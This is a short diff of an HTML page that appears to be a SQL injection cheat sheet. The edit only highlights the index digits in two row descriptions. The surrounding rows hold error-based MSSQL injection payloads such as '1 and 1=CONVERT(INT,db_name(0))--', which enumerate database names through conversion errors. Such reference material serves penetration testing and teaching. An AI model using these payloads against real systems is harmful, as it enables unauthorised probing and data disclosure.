@@ -368,11 +368,11 @@ layout: default
                 <td>
                     <table>
                         <tr>
-                            <td>Enumerate db 0 name (Generate error: [SqlException (0x80131904): Conversion failed when converting the nvarchar value '&lt;db_name(0)&gt;' to data type int.])</td>
+                            <td>Enumerate db 0 name (Generate error: [SqlException (0x80131904): Conversion failed when converting the nvarchar value '&lt;db_name(<mark>0</mark>)&gt;' to data type int.])</td>
                             <td>1 and 1=CONVERT(INT,db_name(0))--</td>
                         </tr>
                         <tr>
-                            <td>Enumerate db 1 name (Generate error: [SqlException (0x80131904): Conversion failed when converting the nvarchar value '&lt;db_name(1)&gt;' to data type int.])</td>
+                            <td>Enumerate db 1 name (Generate error: [SqlException (0x80131904): Conversion failed when converting the nvarchar value '&lt;db_name(<mark>1</mark>)&gt;' to data type int.])</td>
                             <td>1 and 1=CONVERT(INT,db_name(1))--</td>
                         </tr>
                     </table>
